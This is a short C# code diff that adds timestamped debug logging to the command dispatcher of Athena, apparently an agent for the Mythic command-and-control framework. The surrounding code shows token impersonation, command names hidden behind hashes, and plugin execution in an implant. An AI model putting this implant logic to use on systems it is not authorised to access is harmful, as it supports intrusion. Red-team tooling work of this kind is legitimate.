@@ -58,7 +58,7 @@ namespace Athena.Commands
             job.started = true; 
             if(task.token != 0)
             {
-                Debug.WriteLine("Setting thread impersonation.");
+                Debug.WriteLine($"[{DateTime.Now}] Setting thread impersonation.");
                 if (!await this.tokenHandler.ThreadImpersonate(task.token))
                 {
                     this.responseResults.Add(new ResponseResult()
@@ -72,7 +72,7 @@ namespace Athena.Commands
                 }
             }
 
-            Debug.WriteLine($"Received Job: {job.task.command} with hash {job.task.command.ToHash()}");
+            Debug.WriteLine($"[{DateTime.Now}] Received Job: \"{job.task.command}\" with hash value of {job.task.command.ToHash()}");
             switch (job.task.command.ToHash())
             {
                 case "FD456406745D816A45CAE554C788E754": //download
@@ -390,12 +390,15 @@ namespace Athena.Commands
         /// <param name="job">MythicJob containing execution parameters</param>
         private async Task<object> CheckAndRunPlugin(MythicJob job)
         {
+            Debug.WriteLine($"[{DateTime.Now}] Checking if command is loaded.");
             if (await this.assemblyHandler.IsCommandLoaded(job.task.command))
             {
+                Debug.WriteLine($"[{DateTime.Now}] Command is loaded, executing.");
                 return await this.assemblyHandler.RunLoadedCommand(job);
             }
             else
             {
+                Debug.WriteLine($"[{DateTime.Now}] Command is not loaded.");
                 return new ResponseResult()
                 {
                     completed = "true",
